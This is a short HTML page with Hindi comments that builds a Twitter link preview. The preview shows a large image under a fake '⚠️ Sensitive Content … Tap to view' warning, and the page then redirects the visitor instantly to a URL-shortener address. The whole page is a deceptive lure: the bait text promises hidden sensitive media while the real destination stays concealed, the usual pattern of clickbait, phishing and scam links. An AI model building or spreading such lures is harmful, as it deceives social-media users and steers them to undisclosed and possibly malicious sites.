<!DOCTYPE html>
<html>
<head>
    <!-- यह Twitter को बड़ी इमेज दिखाने के लिए कहता है -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="⚠️ Sensitive Content">
    <meta name="twitter:description" content="This media may contain sensitive content. Tap to view.">
    
    <!-- आपकी अपलोड की हुई संवेदनशील इमेज का नाम -->
    <meta name="twitter:image" content="ChatGPT Image Oct 6, 2026, 01_00_39 AM.png">
    
    <!-- जब कोई क्लिक करेगा तो इस लिंक पर ऑटोमैटिक रीडायरेक्ट हो जाएगा -->
    <meta http-equiv="refresh" content="0;url=https://shorturl.at">
</head>
<body>
    <p>Redirecting to destination...</p>
</body>
</html>
